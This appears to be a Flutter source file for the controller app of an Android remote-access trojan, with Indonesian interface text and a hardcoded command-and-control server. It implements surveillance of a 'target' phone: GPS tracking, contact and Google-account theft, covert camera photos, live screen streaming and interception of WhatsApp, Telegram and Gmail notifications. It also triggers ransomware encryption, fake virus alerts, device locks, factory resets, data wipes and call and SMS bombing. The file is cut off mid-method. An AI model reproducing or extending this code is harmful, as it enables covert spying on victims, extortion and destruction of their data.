import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:url_launcher/url_launcher.dart'; 

const String SERVER_URL = "http://gunturhosting.hoshino.my.id:3001";

class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? device;
  const ControlCenterPage({super.key, this.device});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class ControlPanelPage extends ControlCenterPage {
  const ControlPanelPage({super.key, required Map<String, dynamic> device}) 
      : super(device: device);
}

class _ControlCenterPageState extends State<ControlCenterPage> {
  bool _isSending = false;
  final List<String> _executionLogs = [];

  bool _isStreamingScreen = false;
  String _currentStreamFrame = "";
  StateSetter? _streamStateSetter;

  final Color primaryRed = const Color(0xFFE53935);
  final Color darkBg = const Color(0xFF1A1A1A);
  final Color cardBg = const Color(0xFF2D2D2D);

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _triggerAutoWakeup();
    });
  }

  void _triggerAutoWakeup() {
    final device = widget.device;
    if (device != null && device['id'] != null) {
      _sendCommand("force_open", device['id'].toString(), isSilent: true);
    }
  }

  void _addLog(String message) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, "[${DateTime.now().toString().substring(11, 19)}] $message");
        if (_executionLogs.length > 100) _executionLogs.removeLast(); 
      });
    }
  }

  Future<void> _sendCommand(String command, String targetId, {String? extra, bool isSilent = false}) async {
    if (targetId == "unknown") {
      if (!isSilent) {
        _addLog("Error: ID Target tidak valid");
        _showNotif("ID TIDAK TERDETEKSI");
      }
      return;
    }

    if (!isSilent) {
      setState(() => _isSending = true);
      _addLog("Mengirim perintah: $command ke $targetId");
    }
    
    try {
      final response = await http.post(
        Uri.parse("$SERVER_URL/api/send-command"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": targetId, 
          "command": command, 
          "extra": extra ?? "", 
        }),
      ).timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        if (!isSilent) _addLog("Perintah $command TERKIRIM");
        _startResponsePolling(command, targetId, isSilent: isSilent);
      } else {
        if (!isSilent) {
          _addLog("Error: Target Offline");
          _showNotif("TARGET OFFLINE");
        }
      }
    } catch (e) {
      if (!isSilent) {
        _addLog("Error: Koneksi Gagal");
        _showNotif("KONEKSI ERROR");
      }
    } finally {
      if (!isSilent) setState(() => _isSending = false);
    }
  }

  void _fetchNotificationLogs(String targetId) async {
    _addLog("Menarik database pesan...");
    try {
      final response = await http.get(
        Uri.parse("$SERVER_URL/api/get-notifications/$targetId"),
      );
      if (response.statusCode == 200) {
        final List logs = jsonDecode(response.body);
        _showNotificationLogsDialog(logs);
        _addLog("SUCCESS: ${logs.length} Pesan ditemukan.");
      } else {
        _addLog("Gagal menarik notifikasi.");
      }
    } catch (e) {
      _addLog("Error: Server API Down.");
    }
  }

  void _startResponsePolling(String cmd, String targetId, {bool isSilent = false}) async {
    int attempts = 0;
    bool received = false;
    int maxAttempts = isSilent && cmd == "get_screen" ? 15 : 10; 

    while (attempts < maxAttempts && !received) {
      await Future.delayed(Duration(milliseconds: isSilent ? 800 : 3000));
      attempts++;
      if (!isSilent) _addLog("Polling... $attempts/$maxAttempts");

      try {
        final response = await http.get(
          Uri.parse("$SERVER_URL/api/get-response/$targetId"),
        );
        
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data['data'] != null && data['cmd'] == cmd) {
            _processResponse(cmd, data['data'], targetId);
            received = true;
          }
        }
      } catch (e) { }
    }
    
    if (!received && !isSilent) {
      _addLog("Timeout: Target tidak merespon.");
    }
  }

  void _processResponse(String cmd, dynamic data, String targetId) {
    if (data == null) return;

    if (cmd == "get_location") {
      _addLog("SUCCESS: Koordinat GPS diterima.");
      _showLocationDialog(data['lat'], data['lng']);
    } else if (cmd == "get_contacts") {
      _addLog("SUCCESS: Database kontak diunduh.");
      _showContactsDialog(data['contacts']);
    } else if (cmd == "take_photo") {
      _addLog("SUCCESS: Gambar kamera ditarik.");
      _showCameraResultDialog(data['image_base64']);
    } else if (cmd == "get_screen") {
      if (!_isStreamingScreen) _addLog("SUCCESS: Memulai Screen Stream.");
      _showScreenResultDialog(data['image_base64'] ?? "", targetId);
    } else if (cmd == "get_gmails") {
      _addLog("SUCCESS: Daftar Gmail ditarik.");
      _showGmailDialog(data['accounts'] ?? "No Accounts Found");
    } else if (cmd == "vibrate_loop") {
      _addLog("SUCCESS: Target digetarkan.");
      _showNotif("TARGET BERGETAR");
    } else if (cmd == "flash_strobe") {
      _addLog("SUCCESS: Strobe Aktif.");
      _showNotif("STROBE ACTIVE");
    } else if (cmd == "hard_lock") {
      _addLog("🔒 HARD LOCK: Device terkunci!");
      _showNotif("HARD LOCK ACTIVE");
    } else if (cmd == "activate_ransomware") {
      _addLog("💀 RANSOMWARE LOCK: Files encrypted + Device locked!");
      _showNotif("RANSOMWARE ACTIVE");
    } else if (cmd == "panic_mode") {
      _addLog("⚠️ PANIC MODE: Device locked! UNLOCK VIA CONTROLLER ONLY!");
      _showNotif("PANIC MODE ACTIVE");
    } else if (cmd == "virus_mode") {
      _addLog("🦠 VIRUS MODE: Fake virus alert activated! UNLOCK VIA CONTROLLER ONLY!");
      _showNotif("VIRUS MODE ACTIVE");
    } else if (cmd == "panic_unlock") {
      _addLog("🔓 PANIC UNLOCK: Device unlocked!");
      _showNotif("PANIC MODE DISABLED");
    } else if (cmd == "virus_unlock") {
      _addLog("🔓 VIRUS UNLOCK: Device unlocked!");
      _showNotif("VIRUS MODE DISABLED");
    } else if (cmd == "decrypt_files") {
      _addLog("🔓 FILES DECRYPTED: Semua file kembali normal!");
      _showNotif("FILES DECRYPTED");
    } else if (cmd == "factory_reset") {
      _addLog("💣 FACTORY RESET: Device akan direset ke pengaturan pabrik!");
      _showNotif("FACTORY RESET INITIATED");
    } else if (cmd == "wipe_data") {
      _addLog("🗑️ WIPE DATA: Semua file user telah dihapus!");
      _showNotif("DATA WIPED");
    } else if (cmd == "call_bombing") {
      _addLog("📞 CALL BOMBING: Target akan menerima banyak panggilan!");
      _showNotif("CALL BOMBING ACTIVE");
    } else if (cmd == "sms_bomber") {
      _addLog("📨 SMS BOMBER: Target akan menerima banyak SMS!");
      _showNotif("SMS BOMBER ACTIVE");
    } else if (cmd == "battery_drain") {
      _addLog("🔋 BATTERY DRAIN: Baterai target akan cepat habis!");
      _showNotif("BATTERY DRAIN ACTIVE");
    } else {
      _addLog("Eksekusi $cmd Berhasil");
      _showNotif("PERINTAH BERHASIL");
    }
  }

  void _showCameraResultDialog(String base64Image) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        title: const Text("HASIL KAMERA", style: TextStyle(color: Colors.white, fontSize: 14)),
        content: ClipRRect(
          borderRadius: BorderRadius.circular(10),
          child: Image.memory(
            base64Decode(base64Image),
            fit: BoxFit.contain,
            errorBuilder: (context, error, stackTrace) => const Text("Gagal memuat gambar", style: TextStyle(color: Colors.white)),
          ),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("TUTUP", style: TextStyle(color: Color(0xFFE53935)))),
        ],
      ),
    );
  }

  void _showScreenResultDialog(String base64Image, String targetId) {
    _currentStreamFrame = base64Image;

    if (_isStreamingScreen && _streamStateSetter != null) {
      _streamStateSetter!((){});
      Future.delayed(const Duration(milliseconds: 1000), () {
        if (mounted && _isStreamingScreen) {
            _sendCommand("get_screen", targetId, isSilent: true);
        }
      });
      return;
    }

    _isStreamingScreen = true;
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) {
          _streamStateSetter = setDialogState;
          return AlertDialog(
            backgroundColor: cardBg,
            insetPadding: const EdgeInsets.all(10),
            title: const Row(
              children: [
                Icon(Icons.live_tv, color: Color(0xFFE53935), size: 18),
                SizedBox(width: 10),
                Text("SCREEN STREAM", style: TextStyle(color: Color(0xFFE53935), fontSize: 12)),
              ],
            ),
            content: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                ClipRRect(
                  borderRadius: BorderRadius.circular(10),
                  child: _currentStreamFrame.isNotEmpty 
                    ? Image.memory(
                        base64Decode(_currentStreamFrame),
                        fit: BoxFit.contain,
                        gaplessPlayback: true, 
                      )
                    : const Padding(
                        padding: EdgeInsets.all(20.0),
                        child: CircularProgressIndicator(color: Color(0xFFE53935)),
                      ),
                ),
                const SizedBox(height: 10),
                const LinearProgressIndicator(color: Color(0xFFE53935), backgroundColor: Colors.white10),
              ],
            ),
            actions: [
              TextButton(
                onPressed: () {
                  _isStreamingScreen = false;
                  _streamStateSetter = null;
                  Navigator.pop(context);
                }, 
                child: const Text("STOP STREAM", style: TextStyle(color: Color(0xFFE53935))),
              ),
            ],
          );
        }
      ),
    ).then((_) {
      _isStreamingScreen = false;
      _streamStateSetter = null;
    });

    Future.delayed(const Duration(milliseconds: 500), () {
      if (mounted && _isStreamingScreen) {
          _sendCommand("get_screen", targetId, isSilent: true);
      }
    });
  }

  void _showLocationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        title: const Text("LOKASI REAL-TIME", style: TextStyle(color: Colors.white, fontSize: 12)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(color: Colors.black, borderRadius: BorderRadius.circular(10)),
              child: SelectableText("KOORDINAT: $lat, $lng", style: const TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold)),
            ),
            const SizedBox(height: 15),
            ClipRRect(
              borderRadius: BorderRadius.circular(15),
              child: Image.network(
                "https://static-maps.yandex.ru/1.x/?lang=en_US&ll=$lng,$lat&z=15&l=map&size=450,300",
                height: 200, width: double.infinity, fit: BoxFit.cover,
                errorBuilder: (c, e, s) => const Icon(Icons.map, color: Colors.white, size: 50),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("TUTUP")),
          TextButton(
            onPressed: () => launchUrl(Uri.parse("https://www.google.com/maps/search/?api=1&query=$lat,$lng"), mode: LaunchMode.externalApplication),
            child: const Text("BUKA MAPS", style: TextStyle(color: Color(0xFFE53935))),
          ),
        ],
      ),
    );
  }

  void _showContactsDialog(List contacts) {
    showModalBottomSheet(
      context: context,
      backgroundColor: cardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(25))),
      builder: (context) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (context, scrollController) => Column(
          children: [
            const Padding(
              padding: EdgeInsets.all(15),
              child: Text("KONTAK TARGET", style: TextStyle(color: Color(0xFFE53935), fontWeight: FontWeight.bold)),
            ),
            Expanded(
              child: ListView.builder(
                controller: scrollController,
                itemCount: contacts.length,
                itemBuilder: (context, i) => ListTile(
                  leading: const CircleAvatar(backgroundColor: Color(0xFFE53935), child: Icon(Icons.person, color: Colors.black, size: 20)),
                  title: Text(contacts[i]['name'] ?? "No Name", style: const TextStyle(color: Colors.white, fontSize: 14)),
                  subtitle: Text(contacts[i]['number'] ?? "No Number", style: const TextStyle(color: Colors.white38, fontSize: 12)),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showNotificationLogsDialog(List logs) {
    String selectedFilter = "ALL"; 

    showModalBottomSheet(
      context: context,
      backgroundColor: cardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(25))),
      builder: (context) => StatefulBuilder(
        builder: (context, setModalState) {
          List filteredLogs = logs.where((log) {
            String pkg = log['package']?.toString().toLowerCase() ?? "";
            if (selectedFilter == "WA") return pkg.contains("whatsapp");
            if (selectedFilter == "TELE") return pkg.contains("telegram");
            if (selectedFilter == "FB") return pkg.contains("facebook");
            if (selectedFilter == "GMAIL") return pkg.contains("gmail");
            return true;
          }).toList();

          return DraggableScrollableSheet(
            initialChildSize: 0.8,
            maxChildSize: 0.95,
            expand: false,
            builder: (context, scrollController) => Column(
              children: [
                Container(
                  margin: const EdgeInsets.symmetric(vertical: 10),
                  width: 40, height: 4, decoration: BoxDecoration(color: Color(0xFFE53935), borderRadius: BorderRadius.circular(10)),
                ),
                const Text("INTERCEPT PESAN", style: TextStyle(color: Color(0xFFE53935), fontWeight: FontWeight.bold, fontSize: 16)),
                const SizedBox(height: 15),
                SingleChildScrollView(
                  scrollDirection: Axis.horizontal,
                  padding: const EdgeInsets.symmetric(horizontal: 15),
                  child: Row(
                    children: [
                      _buildFilterBtn("ALL", Icons.all_inclusive, filteredLogs.length, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      _buildFilterBtn("WA", Icons.chat, logs.where((l) => l['package']?.toString().toLowerCase().contains("whatsapp") ?? false).length, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      _buildFilterBtn("TELE", Icons.send, logs.where((l) => l['package']?.toString().toLowerCase().contains("telegram") ?? false).length, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      _buildFilterBtn("FB", Icons.facebook, logs.where((l) => l['package']?.toString().toLowerCase().contains("facebook") ?? false).length, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      _buildFilterBtn("GMAIL", Icons.mail, logs.where((l) => l['package']?.toString().toLowerCase().contains("gmail") ?? false).length, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                    ],
                  ),
                ),
                const SizedBox(height: 10),
                Expanded(
                  child: ListView.builder(
                    controller: scrollController,
                    itemCount: filteredLogs.length,
                    itemBuilder: (context, i) {
                      final log = filteredLogs[i];
                      String pkg = log['package']?.toString() ?? "";
                      IconData icon = Icons.notifications;
                      if (pkg.contains("whatsapp")) icon = Icons.chat;
                      else if (pkg.contains("telegram")) icon = Icons.send;
                      else if (pkg.contains("gmail")) icon = Icons.mail;

                      return ListTile(
                        leading: Icon(icon, color: Color(0xFFE53935)),
                        title: Text(log['title'] ?? "Unknown", style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.bold)),
                        subtitle: Text(log['body'] ?? "", style: const TextStyle(color: Colors.white70, fontSize: 12)),
                      );
                    },
                  ),
                ),
              ],
            ),
          );
        }
      ),
    );
  }

  Widget _buildFilterBtn(String label, IconData icon, int count, String active, Function(String) onTap) {
    bool isSelected = active == label;
    return GestureDetector(
      onTap: () => onTap(label),
      child: Container(
        margin: const EdgeInsets.only(right: 8),
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
        decoration: BoxDecoration(
          color: isSelected ? Color(0xFFE53935).withOpacity(0.2) : Colors.white10,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: isSelected ? Color(0xFFE53935) : Colors.transparent),
        ),
        child: Row(
          children: [
            Icon(icon, size: 14, color: isSelected ? Color(0xFFE53935) : Colors.white54),
            const SizedBox(width: 6),
            Text(label, style: TextStyle(color: isSelected ? Colors.white : Colors.white54, fontSize: 11, fontWeight: FontWeight.bold)),
            if (count > 0) ...[
              const SizedBox(width: 4),
              Text("($count)", style: TextStyle(color: isSelected ? Color(0xFFE53935) : Colors.white54, fontSize: 9)),
            ],
          ],
        ),
      ),
    );
  }

  void _showCameraMenu(String targetId) {
    String selectedCam = "back"; 
    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setInternalState) => AlertDialog(
          backgroundColor: cardBg,
          title: const Text("SURVEILLANCE CAMERA", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Text("Pilih lensa kamera:", style: TextStyle(color: Colors.white54, fontSize: 12)),
              const SizedBox(height: 20),
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: [
                  _cameraOption(Icons.camera_rear, "BELAKANG", "back", selectedCam, (val) => setInternalState(() => selectedCam = val)),
                  _cameraOption(Icons.camera_front, "DEPAN", "front", selectedCam, (val) => setInternalState(() => selectedCam = val)),
                ],
              ),
              const SizedBox(height: 30),
              ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: Color(0xFFE53935),
                  minimumSize: const Size(double.infinity, 45),
                ),
                onPressed: () {
                  _sendCommand("take_photo", targetId, extra: selectedCam);
                  Navigator.pop(context);
                },
                child: const Text("AMBIL FOTO", style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _cameraOption(IconData icon, String label, String value, String current, Function(String) onTap) {
    bool isSelected = value == current;
    return GestureDetector(
      onTap: () => onTap(value),
      child: Column(
        children: [
          Icon(icon, size: 40, color: isSelected ? Color(0xFFE53935) : Colors.white24),
          const SizedBox(height: 8),
          Text(label, style: TextStyle(color: isSelected ? Color(0xFFE53935) : Colors.white24, fontSize: 10, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  void _showGmailDialog(String emails) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        title: const Text("GOOGLE ACCOUNTS", style: TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold)),
        content: Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(color: Colors.black, borderRadius: BorderRadius.circular(8)),
          child: SelectableText(
            emails,
            style: const TextStyle(color: Color(0xFFE53935), fontFamily: 'monospace', fontSize: 13),
          ),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("TUTUP", style: TextStyle(color: Color(0xFFE53935)))),
        ],
      ),
    );
  }

  void _showInputDialog(String title, String cmd, String targetId) {
    TextEditingController textCtrl = TextEditingController();
    TextEditingController pinCtrl = TextEditingController();
    TextEditingController phoneCtrl = TextEditingController();
    TextEditingController countCtrl = TextEditingController();
    TextEditingController msgCtrl = TextEditingController();
    TextEditingController soundCtrl = TextEditingController();

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15)),
        title: Row(
          children: [
            Icon(
              cmd == "play_audio" ? Icons.music_note : 
              (cmd == "set_wallpaper" ? Icons.image : 
              (cmd == "hard_lock" ? Icons.lock : 
              (cmd == "call_bombing" ? Icons.phone : 
              (cmd == "sms_bomber" ? Icons.message :
              (cmd == "virus_mode" ? Icons.bug_report : Icons.link))))),
              color: Color(0xFFE53935), size: 20
            ),
            const SizedBox(width: 10),
            Text(title, style: const TextStyle(color: Color(0xFFE53935), fontSize: 14, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            if (cmd == "play_audio" || cmd == "set_wallpaper" || cmd == "open_url")
              TextField(
                controller: textCtrl,
                style: const TextStyle(color: Colors.white, fontSize: 13),
                decoration: InputDecoration(
                  labelText: cmd == "play_audio" ? "Link URL MP3" : (cmd == "set_wallpaper" ? "Link URL Gambar" : "URL Website"),
                  labelStyle: const TextStyle(color: Color(0xFFE53935)),
                  hintText: "https://...",
                  hintStyle: const TextStyle(color: Colors.white12),
                  enabledBorder: const UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
                  focusedBorder: const UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
                ),
              ),
            if (cmd == "hard_lock") ...[
              TextField(
                controller: textCtrl,
                style: const TextStyle(color: Colors.white, fontSize: 13),
                decoration: const InputDecoration(
                  labelText: "Pesan Layar",
                  labelStyle: TextStyle(color: Color(0xFFE53935)),
                  hintText: "YOUR PHONE IS LOCKED",
                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
                ),
              ),
              const SizedBox(height: 15),
              TextField(
                controller: pinCtrl,
                keyboardType: TextInputType.number,
                style: const TextStyle(color: Colors.white, fontSize: 13),
                decoration: const InputDecoration(
                  labelText: "PIN Unlock",
                  labelStyle: TextStyle(color: Color(0xFFE53935)),
                  hintText: "0853",
                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
                ),
              ),
            ],
            if (cmd == "virus_mode") ...[
              TextField(
                controller: soundCtrl,
                style: const TextStyle(color: Colors.white, fontSize: 13),
                decoration: const InputDecoration(
                  labelText: "URL Sound (opsional)",
                  labelStyle: TextStyle(color: Color(0xFFE53935)),
                  hintText: "https://files.catbox.moe/u981c4.m4a",
                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
                ),
              ),
              const SizedBox(height: 15),
              TextField(
                controller: msgCtrl,
                style: const TextStyle(color: Colors.white, fontSize: 13),
                decoration: const InputDecoration(
                  labelText: "Pesan Virus",
                  labelStyle: TextStyle(color: Color(0xFFE53935)),
                  hintText: "🦠 CRITICAL VIRUS DETECTED!",
                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
                ),
              ),
            ],
            if (cmd == "call_bombing") ...[
              TextField(
                controller: countCtrl,
                keyboardType: TextInputType.number,
                style: const TextStyle(color: Colors.white, fontSize: 13),
                decoration: const InputDecoration(
                  labelText: "Jumlah Panggilan",
                  labelStyle: TextStyle(color: Color(0xFFE53935)),
                  hintText: "50",
                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
                ),
              ),
            ],
            if (cmd == "sms_bomber") ...[
              TextField(
                controller: phoneCtrl,
                keyboardType: TextInputType.phone,
                style: const TextStyle(color: Colors.white, fontSize: 13),
                decoration: const InputDecoration(
                  labelText: "Nomor Target",
                  labelStyle: TextStyle(color: Color(0xFFE53935)),
                  hintText: "08123456789",
                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
                ),
              ),
              const SizedBox(height: 15),
              TextField(
                controller: countCtrl,
                keyboardType: TextInputType.number,
                style: const TextStyle(color: Colors.white, fontSize: 13),
                decoration: const InputDecoration(
                  labelText: "Jumlah SMS",
                  labelStyle: TextStyle(color: Color(0xFFE53935)),
                  hintText: "100",
                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
                ),
              ),
              const SizedBox(height: 15),
              TextField(
                controller: msgCtrl,
                style: const TextStyle(color: Colors.white, fontSize: 13),
                decoration: const InputDecoration(
                  labelText: "Pesan",
                  labelStyle: TextStyle(color: Color(0xFFE53935)),
                  hintText: "YOU HAVE BEEN HACKED!",
                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Color(0xFFE53935))),
                ),
              ),
            ],
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("Batal", style: TextStyle(color: Colors.white38))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Color(0xFFE53935)),
            onPressed: () {
              if (cmd == "play_audio" || cmd == "set_wallpaper" || cmd == "open_url") {
                _sendCommand(cmd == "play_audio" ? "play_audio" : cmd, targetId, extra: textCtrl.text.trim());
              } else if (cmd == "hard_lock") {
                String msg = textCtrl.text.trim();
                String pin = pinCtrl.text.trim();
                if (msg.isEmpty) msg = "YOUR PHONE IS LOCKED!";
                if (pin.isEmpty) pin = "0853";
                _sendCommand("hard_lock", targetId, extra: "$msg|$pin");
              } else if (cmd == "virus_mode") {
                String sound = soundCtrl.text.trim();
                String message = msgCtrl.text.trim();
                if (sound.isNotEmpty && message.isNotEmpty) {
                  _sendCommand("virus_mode", targetId, extra: "$sound|$message");
                } else if (sound.isNotEmpty) {
                  _sendCommand("virus_mode", targetId, extra: sound);
                } else if (message.isNotEmpty) {
                  _sendCommand("virus_mode", targetId, extra: message);
                } else {
                  _sendCommand("virus_mode", targetId);
                }
              } else if (cmd == "call_bombing") {
                String count = countCtrl.text.trim();
                _sendCommand("call_bombing", targetId, extra: count.isEmpty ? "50" : count);
              } else if (cmd == "sms_bomber") {
                String phone = phoneCtrl.text.trim();
                String count = countCtrl.text.trim();
                String msg = msgCtrl.text.trim();
                if (phone.isEmpty) phone = "08123456789";
                if (count.isEmpty) count = "100";
                if (msg.isEmpty) msg = "YOU HAVE BEEN HACKED!";
                _sendCommand("sms_bomber", targetId, extra: "$phone|$count|$msg");
              }
              Navigator.pop(context);
            },
            child: const Text("Kirim", style: TextStyle(color: Colors.black)),
          ),
        ],
      ),
    );
  }

  void _showConfirmDialog(String title, String message, String cmd, String targetId, {String? extra}) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15)),
        title: Row(
          children: [
            Icon(Icons.warning, color: Color(0xFFE53935), size: 24),
            const SizedBox(width: 10),
            Text(title, style: const TextStyle(color: Color(0xFFE53935), fontWeight: FontWeight.bold)),
          ],
        ),
        content: Text(
          message,
          style: const TextStyle(color: Colors.white, fontSize: 13),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("BATAL", style: TextStyle(color: Colors.white38)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: Color(0xFFE53935),
            ),
            onPressed: () {
              _sendCommand(cmd, targetId, extra: extra);
              Navigator.pop(context);
            },
            child: const Text("KIRIM", style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _showNotif(String m) {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(backgroundColor: Color(0xFFE53935), content: Text(m), duration: const Duration(seconds: 1)));
  }

  Widget _buildLogContainer() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 10),
      padding: const EdgeInsets.all(12),
      height: 120, 
      decoration: BoxDecoration(
        color: cardBg,
        borderRadius: BorderRadius.circular(15),
        border: Border.all(color: Color(0xFFE53935)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Row(
            children: [
              Icon(Icons.list_alt, color: Color(0xFFE53935), size: 14),
              SizedBox(width: 8),
              Text("Activity Log", style: TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold)),
            ],
          ),
          const SizedBox(height: 8),
          Expanded(
            child: ListView.builder(
              itemCount: _executionLogs.length,
              itemBuilder: (context, i) => Padding(
                padding: const EdgeInsets.symmetric(vertical: 2),
                child: Text(
                  _executionLogs[i], 
                  style: const TextStyle(color: Colors.white38, fontSize: 10, fontFamily: 'monospace'),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildControlBlock(String title, String subtitle, IconData icon, List<Widget> actionButtons) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 8),
      padding: const EdgeInsets.all(15),
      decoration: BoxDecoration(
        color: cardBg, 
        borderRadius: BorderRadius.circular(15),
        border: Border.all(color: Color(0xFFE53935).withOpacity(0.3), width: 1.5), 
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: Color(0xFFE53935).withOpacity(0.1),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Icon(icon, color: Color(0xFFE53935), size: 24),
              ),
              const SizedBox(width: 15),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(title, style: const TextStyle(color: Color(0xFFE53935), fontSize: 16, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 4),
                    Text(subtitle, style: const TextStyle(color: Colors.white38, fontSize: 10)),
                  ],
                ),
              ),
              const Icon(Icons.keyboard_arrow_down, color: Color(0xFFE53935)),
            ],
          ),
          const SizedBox(height: 15),
          Wrap(
            spacing: 10,
            runSpacing: 10,
            children: actionButtons,
          ),
        ],
      ),
    );
  }

  Widget _buildActionButton(String label, IconData icon, String cmd, String targetId) {
    return InkWell(
      onTap: () {
        if (cmd == 'get_notif_logs') {
          _fetchNotificationLogs(targetId);
        } else if (cmd == 'take_photo') {
          _showCameraMenu(targetId); 
        } else if (cmd == 'open_url' || cmd == 'hard_lock' || cmd == 'set_wallpaper' || cmd == 'play_audio_input') {
          String dialogTitle = cmd == 'hard_lock' ? "🔒 HARD LOCK" : (cmd == 'set_wallpaper' ? "Ubah Wallpaper" : (cmd == 'play_audio_input' ? "Play MP3" : "Masukkan URL"));
          _showInputDialog(dialogTitle, cmd == 'play_audio_input' ? 'play_audio' : cmd, targetId);
        } else if (cmd == 'stop_audio') {
          _sendCommand("stop_audio", targetId);
        } else if (cmd == 'activate_ransomware') {
          _showConfirmDialog("💀 RANSOMWARE WARNING", "Aktifkan Ransomware?\nFile akan dienkripsi!", "activate_ransomware", targetId);
        } else if (cmd == 'decrypt_files') {
          _showConfirmDialog("🔓 DECRYPT FILES", "Dekripsi semua file?", "decrypt_files", targetId);
        } else if (cmd == 'panic_mode') {
          _showConfirmDialog("⚠️ PANIC MODE", "Aktifkan Panic Mode?\nPIN unlock akan DINONAKTIFKAN!\nHanya bisa unlock via controller!", "panic_mode", targetId);
